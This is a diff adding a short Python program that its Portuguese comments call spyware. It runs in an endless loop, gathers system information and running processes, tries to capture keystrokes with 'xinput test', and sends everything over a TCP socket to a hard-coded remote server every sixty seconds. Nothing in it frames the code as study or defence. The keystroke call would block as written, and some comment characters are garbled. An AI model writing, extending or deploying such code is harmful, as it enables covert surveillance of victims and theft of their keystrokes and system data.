@@ -1,0 +1,46 @@
+import os
+import socket
+import subprocess
+import time
+
+# Configuraç�es do Spyware
+SERVER_IP = "192.168.1.100"  # Endereço IP do servidor remoto
+SERVER_PORT = 12345  # Porta do servidor remoto
+SLEEP_TIME = 60  # Tempo de espera entre as coletas de informaç�es (em segundos)
+
+def collect_system_info():
+  
+    system_info = subprocess.check_output(["uname", "-a"])
+    return system_info.decode()
+
+def collect_keyboard_input():
+   
+    keyboard_input = subprocess.check_output(["xinput", "test", "10"])
+    return keyboard_input.decode()
+
+def collect_running_processes():
+   
+    running_processes = subprocess.check_output(["ps", "-aux"])
+    return running_processes.decode()
+
+def send_data_to_server(data):
+  
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+        sock.connect((SERVER_IP, SERVER_PORT))
+        sock.sendall(data.encode())
+
+def main():
+    while True:
+        
+        system_info = collect_system_info()
+        keyboard_input = collect_keyboard_input()
+        running_processes = collect_running_processes()
+
+     
+        data = f"System Info:\n{system_info}\n\nKeyboard Input:\n{keyboard_input}\n\nRunning Processes:\n{running_processes}"
+        send_data_to_server(data)
+
+        time.sleep(SLEEP_TIME)
+
+if __name__ == "__main__":
+    main()
